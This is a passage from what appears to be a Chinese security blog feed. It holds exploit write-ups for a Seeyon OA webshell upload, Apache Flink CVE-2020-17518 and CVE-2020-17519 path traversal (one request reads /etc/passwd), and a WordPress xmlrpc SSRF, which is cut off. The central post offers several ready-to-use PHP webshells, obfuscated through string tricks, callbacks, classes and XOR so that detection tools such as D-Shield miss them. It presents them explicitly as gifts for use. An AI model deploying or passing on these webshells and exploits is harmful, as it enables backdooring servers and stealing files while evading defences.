%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure><p>利用成功：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/490c91fe6eb8083e821cc41675117fa9.png" alt="image-20210112145044165"></p><p>利用失败：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1cfdb4046346668a45062f6f5a3f775a.png" alt="image-20210112145338365"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">冰蝎3 默认马pass : rebeyond</span><br><span class="line">webshell地址: http:&#x2F;&#x2F;127.0.0.1&#x2F;seeyon&#x2F;SeeyouUpdate1.jspx</span><br></pre></td></tr></table></figure><p>成功连接</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fe049bc6974ea60dad1be71af0fc33b7.png" alt="image-20210112143429697"></p><p>内容木马名称都可以自主修改,只是做了gzip数据的压缩然后在进行 url的编码，可以利用下面的工具</p><h1 id="0x03-一件图形化利用"><a href="#0x03-一件图形化利用" class="headerlink" title="0x03 一件图形化利用"></a>0x03 一件图形化利用</h1><p>推荐清水川崎师傅的利用工具</p><p>还能应急响应，根据数据包找到木马在哪里，nb</p><p><img src="https://img-blog.csdnimg.cn/img_convert/db6b27a971e1f0a956eb4d1cacbbecd3.png" alt="image-20210112144139964"></p><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><p>安装最新补丁</p><p><a href="http://service.seeyon.com/patchtools/tp.html#/patchList\?type=\%E5\%AE\%89\%E5\%85\%A8\%E8\%A1\%A5\%E4\%B8\%81\&amp;id=1" target="_blank" rel="noopener">http://service.seeyon.com/patchtools/tp.html#/patchList\?type=\%E5\%AE\%89\%E5\%85\%A8\%E8\%A1\%A5\%E4\%B8\%81\&amp;id=1</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-17518  任意文件写漏洞复现</title>
      <link href="/2021/01/08/CVE-2020-17518%20%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/01/08/CVE-2020-17518%20%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a><strong>0x01 漏洞简介</strong></h1><h2 id="Apache-Flink"><a href="#Apache-Flink" class="headerlink" title="Apache Flink"></a>Apache Flink</h2><p>Apache Flink是一个开源流处理框架，具有强大的流处理和批处理功能。</p><h1 id="CVE-2020-17518-任意文件写漏洞"><a href="#CVE-2020-17518-任意文件写漏洞" class="headerlink" title="CVE-2020-17518 任意文件写漏洞"></a><strong>CVE-2020-17518 任意文件写漏洞</strong></h1><p>Apache Flink 1.11.0中引入了一项更新，该更新在1.11.1及更高的版本和1.11.2中发布。</p><p>Apache Flink 控制面板的Submit New Job处存在任意文件上传：</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a><strong>0x02 影响版本</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.11.0</span><br><span class="line">1.11.1</span><br><span class="line">1.11.2</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a><strong>0x03 漏洞复现</strong></h1><p><img src="https://img-blog.csdnimg.cn/img_convert/af947f7215c0f6b269a8c2fdda19cd11.png" alt="image-20210106172726958"></p><p>写入EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 185</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;success&quot;</span><br><span class="line"></span><br><span class="line">zzzzzzz</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/ed75effc07f8399b4acccb9bd186aa77.png" alt="image-20210108171738233"></p><p>验证写入:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fsuccess</span><br></pre></td></tr></table></figure><p>成功写入：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/204e71263e0fe62f249d0fbcc4af98d3.png" alt="image-20210108171541774"></p><h1 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h1><p>所有用户升级最新版</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;flink.apache.org&#x2F;downloads.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现 Apache Flink CVE-2020-17519 任意文件读取漏洞</title>
      <link href="/2021/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20Apache%20Flink%20CVE-2020-17519%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20Apache%20Flink%20CVE-2020-17519%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a><strong>0x01 漏洞简介</strong></h1><h2 id="Apache-Flink"><a href="#Apache-Flink" class="headerlink" title="Apache Flink"></a>Apache Flink</h2><p>Apache Flink是一个开源流处理框架，具有强大的流处理和批处理功能。</p><h1 id="CVE-2020-17519-任意文件读取漏洞"><a href="#CVE-2020-17519-任意文件读取漏洞" class="headerlink" title="CVE-2020-17519 任意文件读取漏洞"></a><strong>CVE-2020-17519 任意文件读取漏洞</strong></h1><p>Apache Flink 1.11.0中引入了一项更新，该更新在1.11.1及更高的版本和1.11.2中发布。</p><p>该项更新允许攻击者<strong>通过JobManager进程的REST API读取JobManager本地文件系统上的任何文件</strong></p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a><strong>0x02 影响版本</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.11.0</span><br><span class="line">1.11.1</span><br><span class="line">1.11.2</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a><strong>0x03 漏洞复现</strong></h1><p><img src="https://img-blog.csdnimg.cn/img_convert/af947f7215c0f6b269a8c2fdda19cd11.png" alt="image-20210106172726958"></p><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/7e383cf57a9e36bdf8f9c87a68a3dab4.png" alt="image-20210106173035232"></p><h1 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h1><p>所有用户升级最新版</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;flink.apache.org&#x2F;downloads.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webshell多种方法免杀</title>
      <link href="/2020/12/31/webshell%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95%E5%85%8D%E6%9D%80/"/>
      <url>/2020/12/31/webshell%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><ul><li><input checked="" disabled="" type="checkbox"> -2020 最后一天了，这个月其实没有完整的写完东西，这是以前的存货了，应为生病了，真的的难受的不行，什么也干不了，天天站不行坐不行，躺着也不行了。。。哎。。。总之身体真的很重要，别搞坏了身体！！！</li><li>webshell这个东西对于web方向的还是极其重要的，getshell被杀了很难受，于是来研究一波自己的免杀马儿，毕竟别人没有自己的好用，而且分享出来分分钟被杀。</li><li>在本篇文章中将会介绍一些常用的木马免杀技巧</li></ul><h1 id="0x01-检测情况"><a href="#0x01-检测情况" class="headerlink" title="0x01 检测情况"></a>0x01 检测情况</h1><ul><li>WAF一般都是维护一个规则库，记录webshell常用的函数、方法等等，通过这个规则库匹配从而检测是否是木马。</li><li>当匹配上对应特征时就是告警，但是规则匹配肯定会有误报，waf一直告警也很烦，所以waf一般会稳定为首要目标，也会放宽一下规则，这就是绕的基础</li></ul><p>查杀软件我首先：D盾</p><p>『D盾_防火墙』专为IIS设计的一个主动防御的保护软件,以内外保护的方式 防止网站和服务器给入侵,在正常运行各类网站的情 况下，越少的功能，服务器越安全的理念而设计！ 限制了常见的入侵方法，让服务器更安全!</p><h1 id="0x02-PHP一句话"><a href="#0x02-PHP一句话" class="headerlink" title="0x02 PHP一句话"></a>0x02 PHP一句话</h1><p>这次主要是对php的一句话免杀实验</p><p>首先我们先看一下最常见的php一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@$_POST[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解析一下：</p><ul><li>其中 eval () 就是执行命令的函数，</li><li>$_POST[‘a’] 就是接收的数据的函数，a是传递的参数。</li><li>eval函数把接收的数据当作PHP代码来执行。</li><li>这便是一句话木马</li></ul><p>我更加喜爱assert函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert(@$_POST[&#39;a&#39;]); ?&gt;</span><br></pre></td></tr></table></figure><p>原因：</p><p>php5和php7是有差异的</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>eval</td><td>PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为PHP代码执行</td></tr><tr><td>assert</td><td>PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8版本后可以接受两个参数</td></tr></tbody></table><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码。</p><p>相同点：二者都可以执行PHP语句。只不过是，eval规范更加严格一些，必须符合PHP代码要求。而assert则没有那么严格，执行PHP表达式即可。</p><p>简单点说就是：</p><p>eval() 是一个语言构造器而不是一个函数，不能被 可变函数 调用</p><p>assert() 可以被可变函数调用，例如诸多的回调函数，这样就方便了许多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$func &#x3D; $_GET[&quot;func&quot;];</span><br><span class="line">assert(&quot;$func()&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"># 这也是一个一句话，</span><br></pre></td></tr></table></figure><p>0x03 assert函数</p><p>assert是一个断言函数，当assert进行判断时，如果为false，则会发出Warning的提醒，但是依然会继续向下执行。对于调试很好，尤其是可以使用回调函数的时候，如果对用户输入的数据过滤不严谨的话，assert的危害比eval还要大。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/54ce1ed4787903cfc0409ab4cf05eb82.png" alt="image-20201231133401683"></p><p>便需要结合不同编程语言要有不同的应对方式，我用php做实例，总的思路就是：要刨除代码和函数的关系</p><p>大体有以下几个思路：</p><ul><li>字符串变换（拼接、编码、等等。。。）</li><li>函数特性</li><li>类特性</li><li>混合免杀</li><li>奇思妙想</li></ul><h1 id="0x03-字符串变换"><a href="#0x03-字符串变换" class="headerlink" title="0x03 字符串变换"></a>0x03 字符串变换</h1><p>单纯的字符串变化还是有可疑，我们还需要配合其他</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = substr_replace(<span class="string">"xxser"</span>,<span class="string">"asser"</span>,<span class="number">-3</span>);</span><br><span class="line">$aa = <span class="keyword">array</span>(<span class="string">''</span>,$a);</span><br><span class="line">$b = $aa[<span class="number">1</span>].chr(<span class="string">'116'</span>);</span><br><span class="line">$fun=preg_replace(<span class="string">"/xx/"</span>,<span class="string">""</span>,$b);</span><br><span class="line">$cc = substr_replace(<span class="string">""</span>,$fun,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$cc($_POST[<span class="string">'x'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/d2829e597eaf07c368fa4eff6929aa01.png" alt="image-20201231133428867"></p><h1 id="0x04-函数特性"><a href="#0x04-函数特性" class="headerlink" title="0x04 函数特性"></a>0x04 函数特性</h1><p>函数特性里面我知道的有：</p><ul><li>自定义函数绕过</li><li>变形回调</li><li>数组</li><li>可变变量</li></ul><h1 id="自定义函数绕过"><a href="#自定义函数绕过" class="headerlink" title="自定义函数绕过"></a>自定义函数绕过</h1><p>纯自定义函数还是可以绕过的</p><p>下面是送大家的免杀马,估计过几天就废了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">function zeo($b)&#123;</span><br><span class="line">    return $b;</span><br><span class="line">&#125;</span><br><span class="line">function ass($a)&#123;</span><br><span class="line">    return eval($a);</span><br><span class="line">&#125;</span><br><span class="line">function post()&#123;</span><br><span class="line">    return $_POST[&#39;x&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function run()&#123;</span><br><span class="line">return zeo(ass)(zeo(post)());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">zeo(ass)(zeo(post)());</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/646a82028945301a6edeb1f37503362a.png" alt="image-20201231133441831"></p><h1 id="回调函数-组合绕过"><a href="#回调函数-组合绕过" class="headerlink" title="回调函数+组合绕过"></a>回调函数+组合绕过</h1><p>这个现在有点费劲了,找了下面这些</p><p>大部分都已经被拉黑了。。。单独用都得死</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array()</span><br><span class="line">call_user_func()</span><br><span class="line">array_filter() </span><br><span class="line">array_walk()  </span><br><span class="line">array_map()</span><br><span class="line">array_reduce()</span><br><span class="line">array_walk() </span><br><span class="line">array_walk_recursive()</span><br><span class="line">filter_var() </span><br><span class="line">filter_var_array() </span><br><span class="line">uasort() </span><br><span class="line">uksort() </span><br><span class="line">registregister_shutdown_function()</span><br><span class="line">register_tick_function()</span><br><span class="line">forward_static_call_array(assert,array($_POST[x]));</span><br></pre></td></tr></table></figure><ul><li>所以只能稍微配合上面的内容，奉献下面的免杀马</li><li>这个那就是定义个函数加个简单的拼接</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function zeo($c,$d)&#123;</span><br><span class="line">pj()($c,$d);</span><br><span class="line">&#125;</span><br><span class="line">function pj()&#123;</span><br><span class="line">return &quot;register_shut&quot;.&quot;down_function&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b&#x3D;$_POST[&#39;x&#39;];</span><br><span class="line">zeo(assert,$b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/fa6fd1f374f10247944b393aafb32dc0.png" alt="image-20201231133455779"></p><h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><p>考虑见要执行的一句话木马程序放到数组中执行达到绕过的目的</p><p>下面也是老样子，免杀马送上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b &#x3D; substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);</span><br><span class="line">$a &#x3D; array($arrayName &#x3D; ($arrayName &#x3D;($arrayName &#x3D; array(&#39;a&#39; &#x3D;&gt; $b($_POST[&#39;x&#39;])))));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/a6131508739c99c0eecd26f790efbc31.png" alt="image-20201231133508080"></p><h1 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h1><p>PHP中有一种变量叫做可变变量，这种变量不是一种基础类型的变量。可变变量是指一个普通变量的值可以作为另一个变量的名称被使用。这句话听起来有些抽象。我们可以通过实例来展示可变变量的定义以及实用。</p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &#39;hello&#39;;</span><br><span class="line">$$a &#x3D; &#39;world&#39;;</span><br><span class="line">echo $hello;</span><br><span class="line"># 输出就是world</span><br></pre></td></tr></table></figure><p>在上面这段代码中，第一行是一个普通的变量定义，变量名称为a，变量值为hello。</p><p>第二行使用变量a的值，定义了一个变量，这个变量的名字叫做hello（也就是a的值），值为world。</p><p>将这个变量输出之后的结果是：world。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$zeo&#x3D;&#39;dalao&#39;;</span><br><span class="line">$$zeo&#x3D;$_POST[&#39;x&#39;];</span><br><span class="line">eval($dalao);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/Users/zy/Library/Application%20Support/typora-user-images/image-20200407220547482.png" alt="image-20200407220547482"></p><p>不行了，这个已经有点问题了，那么只能把eval函数在再处理一下，要结合下面的特殊字符干扰</p><h1 id="0x05-特殊字符干扰"><a href="#0x05-特殊字符干扰" class="headerlink" title="0x05 特殊字符干扰"></a>0x05 特殊字符干扰</h1><ul><li>要求是能干扰到杀软的正则判断，还要代码能执行。</li><li>这个可以自己fuzz</li><li>大概就是说各种回车、换行、null和空白字符</li><li>我这里试了一下成功了，配合上面的可变变量</li></ul><p>下面送上免杀马一个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$zeo&#x3D;&#39;dalao&#39;;</span><br><span class="line">$$zeo&#x3D;$_POST[&#39;x&#39;];</span><br><span class="line">eval(&#96;&#96;.$dalao);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/a6131508739c99c0eecd26f790efbc31.png" alt=""></p><h1 id="0x06-使用类绕过"><a href="#0x06-使用类绕过" class="headerlink" title="0x06 使用类绕过"></a>0x06 使用类绕过</h1><p>类现在发现好多人在用，这个好像D盾检测的最轻，用类自然就少不了魔法函数</p><p>简单构造一个类的免杀马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class zeo2</span><br><span class="line">&#123;</span><br><span class="line">  public $b &#x3D;&#39;&#39;;</span><br><span class="line">  </span><br><span class="line">  function post()&#123;</span><br><span class="line">    return $_POST[&#39;x&#39;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">class zeo extends zeo2</span><br><span class="line">&#123;</span><br><span class="line">  public $code&#x3D;null;</span><br><span class="line">  function __construct()&#123;</span><br><span class="line">  $code&#x3D;parent::post();</span><br><span class="line">    assert($code);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$blll &#x3D; new zeo;</span><br><span class="line">$bzzz &#x3D; new zeo2;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/44d273bb647591a3153c24c47734eb6a.png" alt="image-20201231133525255"></p><h1 id="0x07-还有一种无字母的马"><a href="#0x07-还有一种无字母的马" class="headerlink" title="0x07 还有一种无字母的马"></a>0x07 还有一种无字母的马</h1><p>主要思路就是：</p><ul><li>没有字母，简单来说就是字母被替代了</li><li>就是用各种运算，例如异或，拼装出来想要的函数</li><li>最后能构造出a-z中任意一个字符。</li><li>然后再利用PHP允许动态函数执行的特点，</li><li>拼接处一个函数名，如“assert”，然后动态执行之即可。</li></ul><p>参考P牛的，这个讲的已经很清楚，想了解的可以看看</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p>我送上一道之前做的题，异曲同工，很有意思。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_++;</span><br><span class="line">$__ &#x3D; (&quot;&#96;&quot; ^ &quot;?&quot;) . (&quot;:&quot; ^ &quot;&#125;&quot;) . (&quot;%&quot; ^ &quot;&#96;&quot;) . (&quot;&#123;&quot; ^ &quot;&#x2F;&quot;);</span><br><span class="line">$___ &#x3D; (&quot;$&quot; ^ &quot;&#123;&quot;) . (&quot;~&quot; ^ &quot;.&quot;) . (&quot;&#x2F;&quot; ^ &quot;&#96;&quot;) . (&quot;-&quot; ^ &quot;~&quot;) . (&quot;(&quot; ^ &quot;|&quot;);</span><br><span class="line">(&#39;%05&#39;^&#39;&#96;&#39;)</span><br><span class="line">#  “^”为异或运算符,在PHP中,两个变量进行异或时,会将字符串转换成二进制再进行异或运算,异或运算完，又将结果从二进制转换成了字符串。</span><br><span class="line">$&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h1><ul><li>感觉下来一句话的免杀还是比较简单的，单一的方法不太好多，但是组合几个方法还是很方便的。</li><li>个人感觉PHP免杀的要点就在于PHP允许动态函数执行的特点，提供很多的思路。</li><li>后续就是研究流量的免杀和菜刀的免杀了。</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WordPress xmlrpc.php SSRF漏洞复现</title>
      <link href="/2020/11/23/WordPress%20xmlrpc.php%20SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/11/23/WordPress%20xmlrpc.php%20SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-WordPress-xmlrpc-php-存在SSRF漏洞"><a href="#0x01-WordPress-xmlrpc-php-存在SSRF漏洞" class="headerlink" title="0x01 WordPress xmlrpc.php 存在SSRF漏洞"></a>0x01 WordPress xmlrpc.php 存在SSRF漏洞</h1><p>通过Pingback可以实现的服务器端请求伪造 (Server-side request forgery，SSRF)和远程端口扫描。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>WordPress 版本&lt; 3.5.1</p><p>造成的影响<br>1、可以对业务内网进行探测。<br>2、攻击运行在内网或本地的应用程序（比如溢出攻击）。<br>3、利用file协议读取本地文件等</p><h1 id="0x03漏洞验证"><a href="#0x03漏洞验证" class="headerlink" title="0x03漏洞验证"></a>0x03漏洞验证</h1><p>第一步：直接访问这个文件，初步判断</p><p><img src="https://img-blog.csdnimg.cn/img_convert/077c4d853d373f42894c23d1ceca9a59.png" alt="image-20201123113715261"></p><p>第二步：发现POC验证数据包</p><p>需要修改三处地方：例如：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host: www.baidu.com</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;DNSLOG地址&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;www.baidu.com&#x2F;?p&#x3D;1&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;</span><br></pre></td></tr></table></figure><p>完整验证数据包</p><figure class="highlight plain"><table><tr><td 